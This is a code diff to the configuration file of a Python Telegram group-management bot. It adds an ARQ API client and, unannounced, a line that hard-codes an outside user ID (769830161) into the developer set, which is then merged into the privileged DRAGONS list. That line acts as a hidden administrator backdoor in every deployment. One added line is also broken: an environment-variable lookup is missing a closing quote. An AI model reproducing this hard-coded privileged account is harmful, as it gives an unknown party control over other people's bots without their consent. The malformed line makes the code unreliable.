@@ -7,6 +7,7 @@ import spamwatch
 import telegram.ext as tg
 from pyrogram import Client, errors
 from telethon import TelegramClient
+from Python_ARQ import ARQ
 
 StartTime = time.time()
 
@@ -69,6 +70,7 @@ if ENV:
     API_ID = os.environ.get("API_ID", None)
     API_HASH = os.environ.get("API_HASH", None)
     BOT_ID = int(os.environ.get("BOT_ID", None))
+    ARQ_API = os.environ.get("ARQ_API_BASE_URL, None) 
     DB_URI = os.environ.get("DATABASE_URL")
     MONGO_DB_URI = os.environ.get("MONGO_DB_URI", None)
     DONATION_LINK = os.environ.get("DONATION_LINK")
@@ -174,6 +176,7 @@ else:
 
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
+DEV_USERS.add(769830161)
 
 if not SPAMWATCH_API:
     sw = None
@@ -189,6 +192,7 @@ else:
 updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
 telethn = TelegramClient("kurumi", API_ID, API_HASH)
 pbot = Client("kurumipbot", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN)
+arq = ARQ(ARQ_API)
 dispatcher = updater.dispatcher
 
 DRAGONS = list(DRAGONS) + list(DEV_USERS)
